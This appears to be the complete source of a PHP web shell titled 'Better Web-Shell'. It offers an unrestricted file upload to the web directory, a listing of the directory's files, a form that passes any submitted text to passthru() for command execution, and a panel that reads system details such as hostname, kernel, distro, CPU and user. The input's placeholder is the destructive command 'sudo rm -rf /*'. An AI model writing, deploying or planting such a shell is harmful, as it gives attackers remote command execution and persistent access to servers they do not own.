<!DOCTYPE html>
<html>
    <head>
        <title>Better Web-Shell</title>
        <style>

        body {
            color: #fff;
            margin:0;
            padding:0;
            font-family: sans-serif;
            background: linear-gradient(#141e30, #243b55);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            width: 450px;
            padding: 40px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
        }

        .space1 {
            padding: 15px;
        }

        .command {
            margin-right: 10px;
            color: #fff;
            width: 280px;
            padding: 10px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
            border: none;
        }

        .submit {
            color: #fff;
            width: 60px;
            padding: 10px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
            border: none;
        }

        .submit:hover {
            cursor: pointer;
        }

        .incard {
            color: #fff;
            width: 350px;
            padding: 10px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
            border: none;
        }
  
        </style>
    </head>
    <body>
        <div class="card">

            <form action="" method="POST" enctype="multipart/form-data">
                <input style="outline: none;" type="file" name="file" class="command">
                <input type="submit" value="Upload" class="submit">
            </form>

            <?php
                if(isset($_FILES['file'])){
                    $file_name = $_FILES['file']['name'];
                    $file_tmp =$_FILES['file']['tmp_name'];
                    move_uploaded_file($file_tmp, $file_name);
                    echo "<script>alert(\"File has been uploaded successfuly!\");</script>";
                }
            ?>

            <div class="space1"></div>

            <div class="incard">
                <ul>
                    <?php
                        $dir_handle = opendir(".");
                        while(($file_name = readdir($dir_handle)) !== false) 
                        { 
                            echo("<li>$file_name</li>");
                        }
                        closedir($dir_handle);
                    ?>
                </ul>
            </div>

            <div class="space1"></div>

            <form action="" method="GET">
                <input style="outline: none;" name="q" type="text" placeholder=" ~$ sudo rm -rf /*" class="command">
                <input class="submit" type="submit" value="Run">
            </form>

            <div class="space1"></div>

            <p>
                <?php
                    if(isset($_GET['q']))
                    {
                        if($_GET['q'] !== "")
                        {
                            passthru($_GET['q']);
                        }
                    }
                ?>
            </p>
        </div> 

        <div class="card" style="margin-left: 50px;">
            <div class="incard">
                <?php
                /* Browser */
                $browser = get_browser(null, true);

                /* CPU */
                $cpu_file = fopen("/proc/cpuinfo", "r");
                error_reporting (E_ALL ^ E_NOTICE);
                while(($line = fgetcsv($cpu_file, 0, ":")) !== FALSE) {
                    $lines_array_cpu[] = $line[1];
                }
                fclose($cpu_file);
                $cpu = $lines_array_cpu[4];

                /* Distro */
                $distro_file = fopen("/etc/os-release", "r");
                while(($line = fgetcsv($distro_file, 0, "=")) !== FALSE) {
                    $lines_array_distro[] = $line[1];
                }
                fclose($distro_file);
                $distro = $lines_array_distro[2];

                /* Editor */
                $editor = getenv("EDITOR");

                /* Hostname */
                $hostname = file_get_contents("/etc/hostname");

                /* Kernel */
                $kernel = file_get_contents("/proc/sys/kernel/osrelease");

                /* Music */
                $music = shell_exec("rsmpc current");

                /* Package count */
                $pkg_list = array_filter(glob("/var/db/pkg/*/*/"), "is_dir");
                $pkgs = count($pkg_list, 0);

                /* Shell */
                $shell = getenv("SHELL");

                /* Uptime */
                $uptime_pre = file_get_contents("/proc/uptime");
                $uptime_array = explode(".", $uptime_pre);
                $uptime = $uptime_array[0];

                if ($uptime > 86400) {
                    $days_pre = $uptime / 60 / 60 / 24;
                    $days_pre = explode(".", $days_pre);
                    $days = ($days_pre[0] . "d");
                } else {
                    $days = "";
                }

                if ($uptime > 3600) {
                    $hours_pre = ($uptime / 60 / 60) % 24;
                    $hours = ($hours_pre . "h");
                } else {
                    $hours = "";
                }

                if ($uptime > 60) {
                    $minutes_pre = ($uptime / 60) % 60;
                    $minutes = ($minutes_pre . "m");
                } else {
                    $minutes = "less than one minute";
                }

                $uptime_message = ($days . " " . $hours . " " . $minutes);

                /* User */
                $user = getenv("USER");

                /* Asseble output into an array*/
                $output = array(
                    array("title"=>"Browser", "Info"=>"$browser[parent]"),
                    array("title"=>"CPU", "Info"=>"$cpu"),
                    array("title"=>"Distro", "Info"=>"$distro"),
                    array("title"=>"Editor", "Info"=>"$editor"),
                    array("title"=>"Hostname", "Info"=>"$hostname"),
                    array("title"=>"Kernel", "Info"=>"$kernel"),
                    array("title"=>"Packages (Portage)", "Info"=>"$pkgs"),
                    array("title"=>"Shell", "Info"=>"$shell"),
                    array("title"=>"Uptime", "Info"=>"$uptime_message"),
                    array("title"=>"User", "Info"=>"$user"),
                    array("title"=>"Music", "Info"=>"$music")
                );

                foreach ($output as $row){
                    array_map('htmlentities', $row);
                    echo implode('<br>', $row);
                } 

                ?>
            </div>
        </div>

    </body>
</html>
